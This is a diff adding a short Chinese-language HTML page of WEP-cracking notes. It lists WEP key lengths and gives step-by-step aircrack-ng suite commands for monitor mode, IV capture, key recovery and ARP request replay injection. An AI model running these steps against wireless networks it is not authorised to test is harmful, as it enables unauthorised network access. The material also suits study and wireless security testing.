@@ -1,0 +1,61 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>wep</title>
+<link href="css/css.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<table align="center"><tr><td>
+    <p><h1><font color="#FF0000">wep</font></h1></p>
+    
+    <h2>
+    <a href="#resources">wep</a><br />
+  	<a href="#aircrack-ng">aircrack-ng 破解步驟</a><br />
+    
+    </h2>
+    
+    <div class="div_boxex"><a name="wep"></a><p><h3>
+    	<p><h2><font color="#FF0000">wep</font></h2>
+       wep 通常key長度
+       <table border="2">
+       <tr><td>長度</td><td>ascill長度</td><td>hex長度</td></tr>
+       <tr><td>64</td><td>5</td><td>10</td></tr>
+       <tr><td>128</td><td>13</td><td>26</td></tr>
+       <tr><td>152</td><td>16</td><td>32</td></tr>
+       </table>
+       
+        </p>
+ 	</h3></p></div>
+   
+    <div class="div_boxex"><a name="aircrack-ng"></a><p><h3>
+    	<p><h2><font color="#FF0000">aircrack-ng 破解步驟</font></h2>        
+<pre>一般WEP需要 2萬個ivs 便能破解
+
+<font color="#FF0000">step 1</font>(啟用wlan0)
+	ifconfig wlan0 up	
+<font color="#FF0000">step 2</font>(進入監聽模式)
+	airmon-ng start wlan0
+<font color="#FF0000">step 3</font>(探測ap)
+	airodump-ng mon0	
+<font color="#FF0000">step 4</font>(收集ivs)
+	airodump-ng --ivs -w logs -c 6 mon0
+	(--ivs	只收集ivs
+	-w		指定保存文件名
+	-c		指定監聽通道)
+<font color="#FF0000">step 5</font>(破解)
+	aircrack-ng *.ivs
+</pre>
+        </p>
+        
+        <p><h2><font color="#FF0000">ArpRequest注入</font></h2>
+<pre>以ARP Request 讀取ARP請求報文 並偽造報文再次重新發出 以刺激AP 產生更多的數據包
+
+aireplay-ng -3 -b AP的mac -h 客戶機mac mon0    
+        </pre>
+        </p>
+  	</h3></p></div>      
+    
+</td></tr></table>
+</body>
+</html>
